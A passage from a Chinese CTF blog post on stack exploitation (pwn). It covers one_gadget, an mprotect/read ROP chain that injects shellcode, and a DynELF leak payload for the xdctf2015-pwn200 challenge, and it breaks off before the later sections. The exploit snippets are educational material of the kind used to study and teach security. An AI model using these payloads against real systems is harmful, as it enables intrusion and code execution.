<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PWN入门到入狱-Stack | Ma9icCR</title><meta name="description" content="PWN入门到入狱-StackELF有以下几种方法操纵ELF:  symbols[&#39;a_function&#39;] 找到 a_function 的地址 got[&#39;a_function&#39;] 找到 a_function的 got plt[&#39;a_function&#39;] 找到 a_function 的 plt next(elf.search(&quot;some_ch"><meta name="keywords" content="pwn"><meta name="author" content="Ma9icCR"><meta name="copyright" content="Ma9icCR"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Stack/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="PWN入门到入狱-Stack"><meta property="og:url" content="https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Stack/"><meta property="og:site_name" content="Ma9icCR"><meta property="og:description" content="PWN入门到入狱-StackELF有以下几种方法操纵ELF:  symbols[&#39;a_function&#39;] 找到 a_function 的地址 got[&#39;a_function&#39;] 找到 a_function的 got plt[&#39;a_function&#39;] 找到 a_function 的 plt next(elf.search(&quot;some_ch"><meta property="og:image" content="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><meta property="article:published_time" content="2022-03-28T02:52:31.000Z"><meta property="article:modified_time" content="2022-06-21T00:13:43.190Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var getCookies = function (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  if (parts.length === 2) return parts.pop().split(';').shift()
}

var autoChangeMode = 'false'
var t = getCookies('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (Cookies.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="prev" title="PWN入门到入狱-Format" href="https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Format/"><link rel="next" title="PWN入门到入狱" href="https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false    
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2022-06-21 08:13:43'
}</script><noscript><style>
#nav {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">34</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">11</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN入门到入狱-Stack"><span class="toc-number">1.</span> <span class="toc-text">PWN入门到入狱-Stack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ELF"><span class="toc-number">1.1.</span> <span class="toc-text">ELF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#one-gadget"><span class="toc-number">1.2.</span> <span class="toc-text">one_gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#函数后不直接加参数"><span class="toc-number">1.3.</span> <span class="toc-text">函数后不直接加参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mprotect"><span class="toc-number">1.4.</span> <span class="toc-text">mprotect</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#read和write函数的输入输出"><span class="toc-number">1.5.</span> <span class="toc-text">read和write函数的输入输出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用-DynELF-泄露函数地址"><span class="toc-number">1.6.</span> <span class="toc-text">使用 DynELF 泄露函数地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#沙箱"><span class="toc-number">1.7.</span> <span class="toc-text">沙箱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text"><span class="toc-number">1.8.</span> <span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">1.9.</span> <span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2syscall"><span class="toc-number">1.10.</span> <span class="toc-text">ret2syscall</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.11.</span> <span class="toc-text">ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2csu"><span class="toc-number">1.12.</span> <span class="toc-text">ret2csu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#orw"><span class="toc-number">1.13.</span> <span class="toc-text">orw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-pivot"><span class="toc-number">1.14.</span> <span class="toc-text">stack pivot</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#srop"><span class="toc-number">1.15.</span> <span class="toc-text">srop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2dl-runtime-resolve-freebuf"><span class="toc-number">1.16.</span> <span class="toc-text">ret2dl_runtime_resolve(freebuf)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2dlresolve-wiki"><span class="toc-number">1.17.</span> <span class="toc-text">ret2dlresolve(wiki)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#32位，NO-RELRO"><span class="toc-number">1.17.0.1.</span> <span class="toc-text">32位，NO RELRO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#32位，Partial-RELRO"><span class="toc-number">1.17.0.2.</span> <span class="toc-text">32位，Partial RELRO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#32位，Full-RELRO"><span class="toc-number">1.17.0.3.</span> <span class="toc-text">32位，Full RELRO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#64位，NO-RELRO"><span class="toc-number">1.17.0.4.</span> <span class="toc-text">64位，NO RELRO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#64位，Partial-RELRO"><span class="toc-number">1.17.0.5.</span> <span class="toc-text">64位，Partial RELRO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#总结"><span class="toc-number">1.17.0.6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目"><span class="toc-number">1.17.0.7.</span> <span class="toc-text">题目</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">Ma9icCR</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">PWN入门到入狱-Stack</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2022-03-28 10:52:31"><i class="far fa-calendar-alt fa-fw"></i> 发表于 2022-03-28</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2022-06-21 08:13:43"><i class="fas fa-history fa-fw"></i> 更新于 2022-06-21</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta__icon"></i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="PWN入门到入狱-Stack"><a href="#PWN入门到入狱-Stack" class="headerlink" title="PWN入门到入狱-Stack"></a>PWN入门到入狱-Stack</h1><h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2><p>有以下几种方法操纵ELF:</p>
<ul>
<li><code>symbols[&#39;a_function&#39;]</code> 找到 <code>a_function</code> 的地址</li>
<li><code>got[&#39;a_function&#39;]</code> 找到 <code>a_function</code>的 got</li>
<li><code>plt[&#39;a_function&#39;]</code> 找到 <code>a_function</code> 的 plt</li>
<li><code>next(elf.search(&quot;some_characters&quot;))</code> 找到包含 <code>some_characters</code>（字符串，汇编代码或者某个数值）的地址.</li>
</ul>
<h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><ul>
<li>概要</li>
</ul>
<p>one_gadget是libc中存在的一些执行<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>的片段，当可以泄露libc地址，并且可以知道libc版本的时候，可以使用此方法来快速控制指令寄存器开启shell。</p>
<p>相比于<code>system(&quot;/bin/sh&quot;)</code>，这种方式更加方便，不用控制RDI、RSI、RDX等参数。运用于不利构造参数的情况。</p>
<ul>
<li>安装与使用方法</li>
</ul>
<p>首先需要安装Ruby（Ruby &lt; 2.4 会导致one_gadget无法安装，最好是通过添加仓库的方式安装）</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加仓库</span></span><br><span class="line">sudo add-apt-repository ppa:brightbox/ruby-ng</span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="comment"># 指定ruby 2.6版本</span></span><br><span class="line">sudo apt-get install ruby2.6 ruby2.6-dev </span><br><span class="line"></span><br><span class="line"><span class="comment"># 贴一条删除旧版本ruby的命令</span></span><br><span class="line">sudo apt-get purge --auto-remove ruby</span><br></pre></td></tr></table></figure>

<p>然后安装one_gadget</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>

<p>使用方法很简单</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget libc.so.6</span><br></pre></td></tr></table></figure>

<ul>
<li>坑</li>
</ul>
<p>one_gadget并不总是可以获取shell，它首先要满足一些条件才能执行成功（如果没有满足条件也执行成功了，那纯粹就是靠脸了）</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">unravel@unravel:~/Desktop/note$ one_gadget libc-2.23.so</span><br><span class="line"></span><br><span class="line">0x45226 execve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL                                <span class="comment"># 这个提示的意思就是在调用one_gadget前需要满足的条件</span></span><br><span class="line">0x4527a execve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf03a4 execve(<span class="string">"/bin/sh"</span>, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1247 execve(<span class="string">"/bin/sh"</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>

<ul>
<li>总结</li>
</ul>
<p>以前从来没注意过one_gadget的调用过程，借这次比赛机会了解了一下，也学到了很多小技巧，在这里记录一下。</p>
<ul>
<li>如果是使用<code>_malloc_hook</code>来调用one_gadget，那么需要配合<code>realloc</code>来构造所需参数，<code>realloc</code>在libc中的符号是<code>__libc_realloc</code></li>
<li>如果是使用其他方式调用one_gadget，比如说修改GOT表，那么需要在栈上提前构造好参数，或者将rax寄存器清零</li>
<li>在泄露libc地址的时候，最好是泄露<code>read</code>函数的地址，因为<code>read</code>函数距离one_gadget的偏移是不会变的，只需要将<code>read</code>函数真实地址减去0x6109，就可以使用one_gadget了，具体可以自行调试一下便知。那这么做的好处就是不用去知道libc的版本，省了很大一部分时间和精力，libc版本是个坑，懂的都懂。</li>
<li>one gadget在32位的libc上会很难去找，也很难用。</li>
</ul>
<h2 id="函数后不直接加参数"><a href="#函数后不直接加参数" class="headerlink" title="函数后不直接加参数"></a>函数后不直接加参数</h2><ul>
<li><p>注意不能在vulnerable函数的返回地址后面直接跟参数，我们需要模拟call system函数的过程，在这个过程中call有一步是将下一条指令的地址压栈，所以我们需要构造一个假的返回地址，当然这个内容随意。</p>
</li>
<li><p>但是当我们需要回显时最好使用exit：</p>
</li>
<li><p>返回地址，这个地址不能乱写，打远程时，如果程序是异常退出了，最后是不给你回显的。所以我们得想办法让程序正常退出。</p>
</li>
<li><p>C语言有个函数是exit，只要执行这个，我们把函数的返回地址写成exit的地址，程序就可以结束并且有回显了。</p>
</li>
</ul>
<h2 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h2><ul>
<li><p>int mprotect(const void *start, size_t len, int prot);</p>
<ul>
<li><p>第一个参数填的是一个地址，是指需要进行操作的地址。</p>
</li>
<li><p>第二个参数是地址往后多大的长度。</p>
</li>
<li><p>第三个参数的是要赋予的权限。</p>
</li>
</ul>
</li>
<li><p>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。prot=7为可读可写可执行。</p>
</li>
<li><p>需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</p>
</li>
<li><p>mprotect函数只要设置3个参数，这边就借用3个寄存器</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary get_started_3dsctf_2016 --only <span class="string">'pop|ret'</span> | grep pop</span><br></pre></td></tr></table></figure>

<ul>
<li>然后来设置mprotect的参数，将返回地址填上read函数，我们接下来要将shellcode读入程序段，需要继续控制程序</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload += p32(pop3_ret) </span><br><span class="line"></span><br><span class="line">payload += p32(mem_addr) </span><br><span class="line">payload += p32(mem_size)  </span><br><span class="line">payload += p32(mem_proc)   </span><br><span class="line"></span><br><span class="line">payload += p32(read_addr)</span><br></pre></td></tr></table></figure>

<ul>
<li>read函数原型</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count)</span></span>;</span><br><span class="line">fd 设为<span class="number">0</span>时就可以从输入端读取内容    设为<span class="number">0</span></span><br><span class="line">buf 设为我们想要执行的内存地址      设为我们已找到的内存地址<span class="number">0x80EB000</span></span><br><span class="line"><span class="built_in">size</span> 适当大小就可以               只要够读入shellcode就可以，设置大点无所谓</span><br></pre></td></tr></table></figure>

<ul>
<li>可以看到read函数也有三个参数要设置，我们就可以继续借用上面找到的有3个寄存器的ret指令</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload += p32(pop3_ret)  </span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0</span>)     </span><br><span class="line">payload += p32(mem_addr)   </span><br><span class="line">payload += p32(<span class="number">0x100</span>) </span><br><span class="line"></span><br><span class="line">payload += p32(mem_addr)<span class="comment">#将read函数的返回地址设置到我们修改的内存的地址，之后我们要往里面写入shellcode</span></span><br></pre></td></tr></table></figure>

<ul>
<li>到这里我们已经完成了修改内存为可读可写可执行，将程序重定向到了我们修改好后的内存地址，接下来我们只要传入shellcode即可</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r.sendline(asm(shellcraft.sh()))<span class="comment">#shellcode可以利用pwntools直接生成</span></span><br><span class="line"><span class="comment"># shellcode=asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh(),arch='i386',os='linux')</span></span><br></pre></td></tr></table></figure>

<h2 id="read和write函数的输入输出"><a href="#read和write函数的输入输出" class="headerlink" title="read和write函数的输入输出"></a>read和write函数的输入输出</h2><ul>
<li>read函数第一个参数为0，为从输入端读取内容</li>
<li>write函数第一个参数为1，为输出内容</li>
</ul>
<h2 id="使用-DynELF-泄露函数地址"><a href="#使用-DynELF-泄露函数地址" class="headerlink" title="使用 DynELF 泄露函数地址"></a>使用 DynELF 泄露函数地址</h2><p>在做漏洞利用时，由于 ASLR 的影响，我们在获取某些函数地址的时候，需要一些特殊的操作。一种方法是先泄露出 libc.so 中的某个函数，然后根据函数之间的偏移，计算得到我们需要的函数地址，这种方法的局限性在于我们需要能找到和目标服务器上一样的 libc.so，而有些特殊情况下往往并不能找到。而另一种方法，利用如 pwntools 的 DynELF 模块，对内存进行搜索，直接得到我们需要的函数地址。</p>
<p>为了使用 DynELF，首先需要有一个 <code>leak(address)</code> 函数，通过这一函数可以获取到某个地址上最少 1 byte 的数据，然后将这个函数作为参数调用 <code>d = DynELF(leak, main)</code>，该模块就初始化完成了，然后就可以使用它提供的函数进行内存搜索，得到我们需要的函数地址。</p>
<ul>
<li>类 DynELF 的初始化方法如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, leak, pointer=None, elf=None, libcdb=True)</span>:</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>leak</code>：leak 函数，它是一个 <code>pwnlib.memleak.MemLeak</code> 类的实例</p>
</li>
<li><p><code>pointer</code>：一个指向 libc 内任意地址的指针</p>
</li>
<li><p><code>elf</code>：elf 文件</p>
</li>
<li><p><code>libcdb</code>：libcdb 是一个作者收集的 libc 库，默认启用以加快搜索。</p>
</li>
<li><p>导出的类方法如下：</p>
<ul>
<li><code>base()</code>：解析所有已加载库的基地址</li>
<li><code>static find_base(leak, ptr)</code>：提供一个 <code>pwnlib.memleak.MemLeak</code>对象和一个指向库内的指针，然后找到其基地址</li>
<li><code>heap()</code>：通过 <code>__curbrk</code>（链接器导出符号，指向当前brk）找到堆的起始地址</li>
<li><code>lookup(symb=None, lib=None)</code>：找到 lib 中 symbol 的地址</li>
<li><code>stack()</code>：通过 <code>__environ</code>（libc导出符号，指向environment block）找到一个指向栈的指针</li>
<li><code>dynamic()</code>：返回指向 <code>.DYNAMIC</code> 的指针</li>
<li><code>elfclass</code>：32 或 64 位</li>
<li><code>elftype</code>：elf 文件类型</li>
<li><code>libc</code>：泄露 build id，下载该文件并加载</li>
<li><code>link_map</code>：指向运行时 link_map 对象的指针</li>
</ul>
</li>
<li><p>实例：</p>
</li>
</ul>
<p>在 libc 中，我们通常使用 <code>write</code>、<code>puts</code>、<code>printf</code> 来打印指定内存的数据。</p>
<p>write 函数用于向文件描述符中写入数据，三个参数分别是文件描述符，一个指针指向的数据和写入数据的长度。该函数的优点是可以读取任意长度的内存数据，即打印数据的长度只由 count 控制，缺点则是需要传递 3 个参数。32 位程序通过栈传递参数，直接将参数布置在栈上就可以了，而 64 位程序首先使用寄存器传递参数，所以我们通常使用通用 gadget 来为 write 函数传递参数。</p>
<p>例子是 xdctf2015-pwn200，在这个程序中也只有 write 可以利用：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ rabin2 -R pwn200</span><br><span class="line">...</span><br><span class="line">vaddr=0x0804a004 paddr=0x00001004 <span class="built_in">type</span>=SET_32 <span class="built_in">read</span></span><br><span class="line">vaddr=0x0804a010 paddr=0x00001010 <span class="built_in">type</span>=SET_32 write</span><br></pre></td></tr></table></figure>

<p>另外我们还需要 read 函数用于读入 ‘/bin/sh` 到 .bss 段中：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S pwn200 | grep .bss</span><br><span class="line">  [25] .bss              NOBITS          0804a020 00101c 00002c 00  WA  0   0 32</span><br></pre></td></tr></table></figure>

<p>栈溢出漏洞很明显，偏移为 112：</p>
<p>在 r2 中对程序进行分析，发现一个漏洞函数，地址为 <code>0x08048484</code>。</p>
<p>于是我们构造 leak 函数如下，即 <code>write(1, addr, 4)</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload  = <span class="string">"A"</span> * <span class="number">112</span></span><br><span class="line">    payload += p32(write_plt)</span><br><span class="line">    payload += p32(vuln_addr)</span><br><span class="line">    payload += p32(<span class="number">1</span>)</span><br><span class="line">    payload += p32(addr)</span><br><span class="line">    payload += p32(<span class="number">4</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    data = io.recv()</span><br><span class="line">    log.info(<span class="string">"leaking: 0x%x --&gt; %s"</span> % (addr, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=elf)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">log.info(<span class="string">"system address: 0x%x"</span> % system_addr)</span><br></pre></td></tr></table></figure>

<p>注意我们需要一个 pppr 的 gadget 来平衡栈：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ropgadget --binary pwn200 --only <span class="string">"pop|ret"</span></span><br><span class="line">...</span><br><span class="line">0x0804856c : pop ebx ; pop edi ; pop ebp ; ret</span><br></pre></td></tr></table></figure>

